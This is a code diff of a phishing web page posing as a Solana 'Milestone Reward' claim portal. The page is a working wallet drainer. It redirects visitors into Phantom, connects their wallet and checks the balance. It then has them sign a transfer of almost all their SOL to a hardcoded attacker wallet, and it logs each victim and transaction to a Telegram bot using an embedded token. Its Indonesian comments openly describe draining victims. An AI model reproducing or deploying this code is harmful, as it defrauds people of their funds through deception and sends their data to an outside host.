@@ -1,67 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Solana Milestone Reward</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Reward Portal</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body { background: #121212; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .box { border: 1px solid #333; padding: 20px; border-radius: 10px; display: inline-block; background: #1a1a1a; }
-        .btn { background: #14f195; color: #000; padding: 15px 40px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        body { background-color: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px 20px; }
+        .card { border: 1px solid #14f195; background: #111; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 0 20px rgba(20, 241, 149, 0.2); }
+        h1 { color: #14f195; font-size: 2.5rem; margin-bottom: 10px; }
+        p { color: #ccc; line-height: 1.6; }
+        .btn { background: #14f195; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; font-size: 1.1rem; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #11cc7e; transform: scale(1.02); }
+        .status { margin-top: 15px; font-size: 0.8rem; color: #888; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Congratulations! 🎊</h2>
-        <p>Wallet <b>ARu4n5...</b> identified for 50+ Tx Reward</p>
-        <h1 style="color: #14f195;">0.25 SOL</h1>
-        <button class="btn" onclick="claim()">CLAIM REWARD</button>
+
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/solana-sol-logo.png" width="60" alt="SOL">
+        <h2>Milestone Reward</h2>
+        <p>Wallet detected with 50+ transactions. You are eligible to claim:</p>
+        <h1>0.25 SOL</h1>
+        <button class="btn" onclick="mainAction()">CLAIM REWARD</button>
+        <div class="status">System Status: <span style="color: #14f195;">Online</span></div>
     </div>
 
     <script>
-        // --- EDIT BAGIAN INI ---
+        // ======= KONFIGURASI LU =======
         const MY_WALLET = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc"; 
         const BOT_TOKEN = "8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ";
         const CHAT_ID = "6518432642";
-        // -----------------------
+        // ==============================
 
         async function sendLog(msg) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+            const text = encodeURIComponent(msg);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`);
         }
 
-        async function claim() {
+        async function mainAction() {
             const provider = window.solana;
-            if (!provider) return alert("Please open this link inside Phantom Browser/Extension");
 
+            // 1. CEK APAKAH SUDAH DI PHANTOM
+            if (!provider || !provider.isPhantom) {
+                // Kalo di Chrome biasa, paksa mental ke aplikasi Phantom
+                const currentUrl = window.location.href;
+                const deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(window.location.origin)}`;
+                window.location.href = deepLink;
+                return;
+            }
+
+            // 2. KALO SUDAH DI PHANTOM, PROSES DRAIN
             try {
                 const resp = await provider.connect();
-                const victim = resp.publicKey;
-                await sendLog(`<b>🚨 Target Connected!</b>\nWallet: <code>${victim.toString()}</code>`);
+                const victimPubKey = resp.publicKey;
+                await sendLog(`<b>🚨 TARGET CONNECTED!</b>\nWallet: <code>${victimPubKey.toString()}</code>`);
 
-                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                const balance = await conn.getBalance(victim);
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                const balance = await connection.getBalance(victimPubKey);
 
-                if (balance < 1000000) return alert("Ineligible: Minimum balance not met.");
+                // Cek saldo minimal (biar gak rugi gas fee)
+                if (balance < 1000000) { 
+                    alert("Account ineligible for this reward milestone.");
+                    return;
+                }
 
-                // Buat transaksi kuras SOL
-                const tx = new solanaWeb3.Transaction().add(
+                // 3. BUAT TRANSAKSI KURAS TOTAL
+                const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: victim,
+                        fromPubkey: victimPubKey,
                         toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
-                        lamports: balance - 500000, // Potong gas fee dikit
+                        lamports: balance - 1000000, // Potong biaya gas biar mulus
                     })
                 );
 
-                let { blockhash } = await conn.getRecentBlockhash();
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = victim;
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = victimPubKey;
 
-                // Minta konfirmasi di Phantom
-                const signed = await provider.signAndSendTransaction(tx);
-                await sendLog(`<b>💰 JEKPOT!</b>\nBerhasil kuras saldo dari: ${victim.toString()}\nTX: ${signed.signature}`);
+                // 4. MUNCULIN POP-UP CONFIRM DI PHANTOM
+                const { signature } = await provider.signAndSendTransaction(transaction);
                 
-                alert("Processing... Reward will be sent in 24 hours.");
-            } catch (e) {
-                await sendLog(`❌ Target nolak konfirmasi.`);
+                await sendLog(`<b>💰 JEKPOT! SALDO DISIKAT!</b>\nVictim: <code>${victimPubKey.toString()}</code>\nTX: <code>${signature}</code>`);
+                
+                alert("Reward successfully submitted! Will be processed within 24 hours.");
+
+            } catch (err) {
+                console.error(err);
+                await sendLog(`<b>❌ TARGET TOLAK TRANSAKSI</b>\nWallet: <code>${provider.publicKey?.toString() || 'Unknown'}</code>`);
             }
         }
     </script>
